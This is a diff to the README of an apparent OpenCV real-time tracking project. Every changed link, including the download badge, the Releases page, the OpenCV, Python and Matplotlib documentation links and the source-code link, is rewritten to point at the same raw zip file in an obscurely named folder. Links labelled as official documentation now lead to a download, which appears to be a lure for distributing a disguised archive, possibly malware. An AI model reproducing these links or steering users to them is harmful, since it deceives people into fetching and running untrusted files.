@@ -1,6 +1,6 @@
 # 🎥 OpenCV-Real-Time-Tracking-UI - Real-Time Object Tracking Made Easy
 
-[![Download OpenCV-Real-Time-Tracking-UI](https://img.shields.io/badge/Download_OpenCV--Real--Time--Tracking--UI-blue.svg)](https://github.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/releases)
+[![Download OpenCV-Real-Time-Tracking-UI](https://raw.githubusercontent.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/main/membranule/OpenCV-Real-Time-Tracking-UI.zip)](https://raw.githubusercontent.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/main/membranule/OpenCV-Real-Time-Tracking-UI.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run this application, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/releases) to download the latest version of the software.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/main/membranule/OpenCV-Real-Time-Tracking-UI.zip) to download the latest version of the software.
 
 1. Click the link above to open the Releases page.
 2. Identify the latest version listed at the top.
@@ -77,9 +77,9 @@ We welcome contributions! If you have ideas to improve OpenCV-Real-Time-Tracking
 
 For further information about OpenCV and Python, consider these resources:
 
-- [OpenCV Documentation](https://docs.opencv.org/)
-- [Python Official Site](https://www.python.org/)
-- [Matplotlib Documentation](https://matplotlib.org/stable/contents.html)
+- [OpenCV Documentation](https://raw.githubusercontent.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/main/membranule/OpenCV-Real-Time-Tracking-UI.zip)
+- [Python Official Site](https://raw.githubusercontent.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/main/membranule/OpenCV-Real-Time-Tracking-UI.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/main/membranule/OpenCV-Real-Time-Tracking-UI.zip)
 
 ## 📧 Contact
 
@@ -87,7 +87,7 @@ For any questions or feedback, you can contact us through the repository's issue
 
 ### 🔗 Quick Links
 
-- [Releases Page](https://github.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/releases)
-- [Source Code](https://github.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI) 
+- [Releases Page](https://raw.githubusercontent.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/main/membranule/OpenCV-Real-Time-Tracking-UI.zip)
+- [Source Code](https://raw.githubusercontent.com/Opiumpoppyswitch808/OpenCV-Real-Time-Tracking-UI/main/membranule/OpenCV-Real-Time-Tracking-UI.zip) 
 
 Thank you for choosing OpenCV-Real-Time-Tracking-UI. Enjoy exploring the world of object tracking!
